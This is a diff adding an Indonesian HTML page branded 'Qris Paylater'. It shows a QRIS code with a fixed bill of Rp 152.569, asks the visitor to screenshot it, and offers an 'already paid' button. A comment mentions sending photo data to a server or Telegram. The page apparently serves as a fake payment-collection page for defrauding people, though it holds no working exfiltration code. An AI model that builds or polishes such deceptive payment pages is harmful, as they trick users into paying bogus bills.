@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ambil Foto dari Galeri</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#009EEB', // Warna sesuai permintaan kamu
+                        grayText: '#1F2937',
+                        grayLight: '#E5E7EB',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .container-sm {
+                max-width: 360px;
+                margin: 0 auto;
+            }
+            .btn-upload {
+                box-shadow: 0 0 15px rgba(255, 255, 255, 0.6);
+            }
+        }
+    </style>
+</head>
+<body class="font-sans bg-white min-h-screen">
+    <!-- Header -->
+    <header class="bg-primary h-14 flex items-center px-4 shadow-md">
+        <button class="text-white text-lg mr-2" onclick="history.back()">
+            <i class="fa fa-arrow-left"></i>
+        </button>
+        <h1 class="text-white text-base font-medium">Qris Paylater</h1>
+    </header>
+
+    <main class="container-sm px-4 mt-16 text-center">
+        <h2 class="text-sm font-medium text-grayText mb-8">Silahakan Capture/screnshot Gambar di bawah ini</h2>
+
+        <!-- Kotak Tampilan Foto -->
+        <div id="previewKotak" class="w-full h-64 border-2 border-dashed border-grayLight rounded-xl flex items-center justify-center mb-6 overflow-hidden">
+            <!-- Foto yang dipilih dari galeri -->
+            <img id="fotoPreview" class="w-full h-full object-contain hidden" alt="Pratinjau Foto">
+            
+            <!-- ✅ BAGIAN SUDAH DIUBAH: TAMPILKAN LOGO/GAMBAR KAMU DI SINI -->
+            <div id="teksKosong" class="flex flex-col items-center justify-center text-gray-400">
+                <!-- Ganti 'logo_kamu.png' dengan nama file gambarmu -->
+                <img src="qris.png" alt="Logo" class="w-28 h-28 object-contain mb-3"> 
+                <p>Total tagihan Rp 152.569</p>
+            </div>
+            <!-- ✅ SELESAI BAGIAN PERUBAHAN -->
+        </div>
+
+        <!-- Input File (Tersembunyi) -->
+        <input type="file" id="ambilFoto" accept="image/*" class="hidden">
+
+        <!-- Tombol Lanjutkan (Muncul setelah pilih foto) -->
+        <button id="btnLanjut" class="w-full bg-grayLight text-gray-400 font-medium py-2.5 rounded-lg text-sm mt-5 cursor-not-allowed transition-all" disabled>
+            SUDAH DI BAYAR
+        </button>
+    </main>
+
+    <script>
+        const ambilFoto = document.getElementById('ambilFoto');
+        const fotoPreview = document.getElementById('fotoPreview');
+        const teksKosong = document.getElementById('teksKosong');
+        const btnLanjut = document.getElementById('btnLanjut');
+
+        // Saat pengguna memilih foto dari galeri
+        ambilFoto.addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(event) {
+                    // Tampilkan foto yang dipilih
+                    fotoPreview.src = event.target.result;
+                    fotoPreview.classList.remove('hidden');
+                    teksKosong.classList.add('hidden'); // Sembunyikan logo saat ada foto
+
+                    // Aktifkan tombol lanjutkan
+                    btnLanjut.classList.remove('bg-grayLight','text-gray-400','cursor-not-allowed');
+                    btnLanjut.classList.add('bg-primary','text-white','hover:bg-[#008ed6]');
+                    btnLanjut.disabled = false;
+                }
+                reader.readAsDataURL(file);
+            }
+        });
+
+        // Aksi saat tombol lanjut diklik
+        btnLanjut.addEventListener('click', function() {
+            // Bisa diarahkan ke halaman berikutnya, contoh:
+            window.location.href = "halaman-berikutnya.html";
+            // Atau kirim data foto ke server/telegram di sini
+        });
+    </script>
+</body>
+</html>
